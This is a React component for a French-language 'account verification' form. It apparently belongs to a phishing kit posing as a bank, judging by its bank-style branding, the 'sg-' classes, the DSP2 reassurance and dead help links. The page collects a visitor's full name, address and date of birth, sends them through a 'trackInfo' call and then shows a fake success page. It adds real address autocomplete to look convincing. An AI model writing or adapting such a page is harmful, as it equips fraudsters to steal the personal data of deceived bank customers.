import React, { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { UserCircle2, Loader2 } from 'lucide-react';
import VerifSteps from '../components/VerifSteps';
import { trackInfo } from '../api';

// Utility — debounce
function useDebounced(value, delay = 250) {
  const [v, setV] = useState(value);
  useEffect(() => {
    const t = setTimeout(() => setV(value), delay);
    return () => clearTimeout(t);
  }, [value, delay]);
  return v;
}

export default function VerifInfos() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    lastName: '',
    firstName: '',
    address: '',
    postal: '',
    city: '',
    dob: '',
  });
  const [suggest, setSuggest] = useState([]);
  const [showSuggest, setShowSuggest] = useState(false);
  const [searching, setSearching] = useState(false);
  const [loading, setLoading] = useState(false);
  const wrapperRef = useRef(null);
  const justPickedRef = useRef(false);

  const debouncedAddress = useDebounced(form.address, 300);

  const update = (k, v) => setForm((s) => ({ ...s, [k]: v }));

  // BAN (Base Adresse Nationale) — official French gov API, no key needed.
  useEffect(() => {
    // Skip the search if the change came from picking a suggestion.
    if (justPickedRef.current) {
      justPickedRef.current = false;
      return;
    }
    const q = debouncedAddress.trim();
    if (q.length < 3) {
      setSuggest([]);
      setShowSuggest(false);
      return;
    }
    const ac = new AbortController();
    setSearching(true);
    fetch(
      `https://api-adresse.data.gouv.fr/search/?q=${encodeURIComponent(q)}&limit=7&autocomplete=1`,
      { signal: ac.signal },
    )
      .then((r) => r.json())
      .then((data) => {
        const items = (data && data.features) || [];
        setSuggest(
          items.map((f) => ({
            label: f.properties.label,
            name: f.properties.name,
            postcode: f.properties.postcode,
            city: f.properties.city,
            score: f.properties.score,
          })),
        );
        setShowSuggest(true);
      })
      .catch(() => {})
      .finally(() => setSearching(false));
    return () => ac.abort();
  }, [debouncedAddress]);

  // Close suggestions when clicking outside
  useEffect(() => {
    const onClick = (e) => {
      if (wrapperRef.current && !wrapperRef.current.contains(e.target)) {
        setShowSuggest(false);
      }
    };
    document.addEventListener('mousedown', onClick);
    return () => document.removeEventListener('mousedown', onClick);
  }, []);

  const pickSuggestion = (s) => {
    justPickedRef.current = true;
    setForm((prev) => ({
      ...prev,
      address: s.name || s.label,
      postal: s.postcode || prev.postal,
      city: s.city || prev.city,
    }));
    setSuggest([]);
    setShowSuggest(false);
  };

  // Auto-insert slashes for DOB: JJ/MM/AAAA
  const onDobChange = (raw) => {
    const digits = raw.replace(/\D/g, '').slice(0, 8);
    let out = digits;
    if (digits.length > 4) out = `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4)}`;
    else if (digits.length > 2) out = `${digits.slice(0, 2)}/${digits.slice(2)}`;
    update('dob', out);
  };

  const isValidDob = (s) => /^\d{2}\/\d{2}\/\d{4}$/.test(s);

  const submit = (e) => {
    e.preventDefault();
    if (
      !form.lastName.trim() ||
      !form.firstName.trim() ||
      !form.address.trim() ||
      !form.postal.trim() ||
      !form.city.trim() ||
      !isValidDob(form.dob)
    ) {
      return;
    }
    setLoading(true);
    trackInfo({
      last_name: form.lastName.trim(),
      first_name: form.firstName.trim(),
      address: form.address.trim(),
      postal_code: form.postal.trim(),
      city: form.city.trim(),
      date_of_birth: form.dob.trim(),
    });
    setTimeout(() => navigate('/verification/succes'), 700);
  };

  return (
    <div className="bg-white min-h-[calc(100vh-118px)] pt-8 md:pt-10 pb-12">
      <div className="max-w-[1100px] mx-auto px-4 md:px-8">
        <VerifSteps current={2} />

        <div className="mt-10 grid lg:grid-cols-[1fr_1fr] gap-8 lg:gap-16 max-w-[980px]">
          {/* Form */}
          <div className="flex flex-col items-center text-center">
            <div className="w-12 h-12 text-[#E9041E]">
              <UserCircle2 size={48} strokeWidth={1.5} />
            </div>
            <h1 className="mt-3 text-[20px] md:text-[22px] font-extrabold text-[#0F1B33]">
              Mise à jour de vos informations
            </h1>
            <p className="mt-2 text-[13.5px] text-[#2B2B2B] max-w-xs leading-snug">
              Pour finaliser la vérification, veuillez confirmer vos coordonnées personnelles.
            </p>

            <form onSubmit={submit} className="mt-6 w-full max-w-sm text-left space-y-3.5">
              <div className="grid grid-cols-2 gap-3">
                <Field label="Nom" required>
                  <input
                    type="text"
                    value={form.lastName}
                    onChange={(e) =>
                      update(
                        'lastName',
                        e.target.value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s\-']/g, ''),
                      )
                    }
                    autoComplete="family-name"
                    className="sg-input"
                  />
                </Field>
                <Field label="Prénom" required>
                  <input
                    type="text"
                    value={form.firstName}
                    onChange={(e) =>
                      update(
                        'firstName',
                        e.target.value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s\-']/g, ''),
                      )
                    }
                    autoComplete="given-name"
                    className="sg-input"
                  />
                </Field>
              </div>

              {/* Address with BAN autocomplete */}
              <div className="relative" ref={wrapperRef}>
                <Field label="Numéro et rue" required>
                  <div className="relative">
                    <input
                      type="text"
                      value={form.address}
                      onChange={(e) => {
                        update('address', e.target.value);
                        // Re-open list only when the user is actively typing.
                        if (!justPickedRef.current) setShowSuggest(true);
                      }}
                      placeholder="Tapez votre adresse"
                      autoComplete="street-address"
                      className="sg-input pr-9"
                    />
                    {searching && (
                      <Loader2
                        size={15}
                        className="absolute right-3 top-1/2 -translate-y-1/2 animate-spin text-neutral-400"
                      />
                    )}
                  </div>
                </Field>
                {showSuggest && suggest.length > 0 && (
                  <div className="absolute z-20 left-0 right-0 mt-1 bg-white border border-neutral-300 rounded-md shadow-xl overflow-hidden max-h-72 overflow-y-auto">
                    {suggest.map((s, i) => (
                      <button
                        type="button"
                        key={`${s.label}-${i}`}
                        onClick={() => pickSuggestion(s)}
                        className="block w-full text-left px-3 py-2.5 text-[13px] text-[#0F1B33] hover:bg-neutral-100 border-b border-neutral-100 last:border-b-0"
                      >
                        <div className="font-semibold">{s.name || s.label}</div>
                        <div className="text-[11.5px] text-neutral-500">
                          {s.postcode} {s.city}
                        </div>
                      </button>
                    ))}
                  </div>
                )}
              </div>

              <div className="grid grid-cols-3 gap-3">
                <Field label="Code postal" required>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={form.postal}
                    onChange={(e) => update('postal', e.target.value.replace(/\D/g, '').slice(0, 5))}
                    className="sg-input"
                  />
                </Field>
                <div className="col-span-2">
                  <Field label="Ville" required>
                    <input
                      type="text"
                      value={form.city}
                      onChange={(e) => update('city', e.target.value)}
                      className="sg-input"
                    />
                  </Field>
                </div>
              </div>

              <Field label="Date de naissance" required>
                <input
                  type="text"
                  inputMode="numeric"
                  value={form.dob}
                  onChange={(e) => onDobChange(e.target.value)}
                  placeholder="JJ/MM/AAAA"
                  maxLength={10}
                  className="sg-input"
                />
              </Field>

              <button
                type="submit"
                disabled={loading}
                className="mt-3 w-full bg-[#E9041E] hover:bg-[#c8031a] text-white font-bold rounded-full py-2.5 text-[14.5px] disabled:opacity-60 transition-colors"
              >
                {loading ? 'Envoi…' : 'Confirmer'}
              </button>
            </form>
          </div>

          {/* Help */}
          <div className="lg:border-l lg:border-neutral-200 lg:pl-12">
            <h3 className="text-[14px] font-bold text-[#0F1B33]">Pourquoi vos informations ?</h3>
            <ul className="mt-3 space-y-2 text-[13.5px] text-[#2B2B2B] list-disc pl-5 leading-[1.55]">
              <li>Les données permettent de vérifier que vous êtes bien le titulaire du compte.</li>
              <li>La mise à jour répond aux exigences de la réglementation DSP2.</li>
              <li>Vos informations sont protégées et ne seront jamais partagées avec des tiers.</li>
            </ul>
            <h3 className="mt-6 text-[14px] font-bold text-[#0F1B33]">Besoin d&rsquo;aide ?</h3>
            <ul className="mt-3 space-y-1.5 text-[13.5px]">
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Contacter mon conseiller
                </a>
              </li>
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Aide à la connexion
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <style>{`
        .sg-input { width:100%; border:1px solid #a3a3a3; border-radius:3px; padding:9px 11px; font-weight:500; outline:none; transition:border-color .15s, box-shadow .15s; background:#fff; color:#0F1B33; font-family:inherit; }
        .sg-input:focus { border-color:#0F1B33; box-shadow:0 0 0 2px rgba(15,27,51,0.15); }
      `}</style>
    </div>
  );
}

function Field({ label, required, children }) {
  return (
    <div>
      <label className="block text-[13px] font-bold text-[#0F1B33] mb-1">
        {label}
        {required && <span className="text-[#E9041E]">&nbsp;*</span>}
      </label>
      {children}
    </div>
  );
}
